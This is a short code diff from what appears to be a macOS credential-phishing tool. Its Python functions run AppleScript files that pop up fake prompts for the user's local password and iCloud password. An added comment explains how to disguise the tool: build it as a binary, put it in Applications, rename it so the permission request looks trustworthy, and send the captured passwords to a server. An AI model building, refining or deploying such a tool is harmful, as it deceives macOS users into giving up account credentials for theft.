@@ -6,10 +6,12 @@ from time import sleep
 # localpass
 # icloud pass
 
+# Generate binary, put in applications, use open -a /Application/[name], what ever the binary is named is what requests permission. You can rename after generation. Instead of print pipe it out to server
+
 def promptSystem():
     try:
         run_command = subprocess.check_output(
-        "osascript system.applescript", shell=True)
+        "osascript /Applications/system.applescript", shell=True)
     except subprocess.CalledProcessError:
         pass
     return run_command.rstrip()
@@ -17,7 +19,7 @@ def promptSystem():
 def promptiCloud():
     try:
         run_command = subprocess.check_output(
-        "osascript icloud.applescript {0}".format(checkiCloudEmail.checkEmail()), shell=True)
+        "osascript /Applications/icloud.applescript {0}".format(checkiCloudEmail.checkEmail()), shell=True)
     except subprocess.CalledProcessError:
         pass
     return run_command
